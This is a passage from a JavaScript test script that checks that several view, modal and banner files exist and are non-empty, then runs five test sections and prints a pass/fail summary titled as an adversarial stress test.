    for (const relPath of viewsAndModals) {
      const fullPath = path.join(rootDir, relPath);
      assert.ok(fs.existsSync(fullPath), `View/Modal file must exist: ${relPath}`);
      const content = fs.readFileSync(fullPath, 'utf8');
      assert.ok(content.length > 50, `View/Modal file ${relPath} must not be empty`);
    }
    console.log(`    All ${viewsAndModals.length} primary views, modals, and banners verified present and populated.`);
  });
}

// ============================================================================
// MAIN RUNNER
// ============================================================================
async function runAll() {
  runSection1();
  runSection2();
  await runSection3();
  runSection4();
  runSection5();

  console.log('\n================================================================================');
  console.log(' EMPIRICAL ADVERSARIAL STRESS TEST SUMMARY');
  console.log(` Total Passed: ${passCount}`);
  console.log(` Total Failed: ${failCount}`);
  console.log('================================================================================\n');

  if (failCount > 0) {
    process.exit(1);
  } else {
    process.exit(0);
  }
}

runAll();
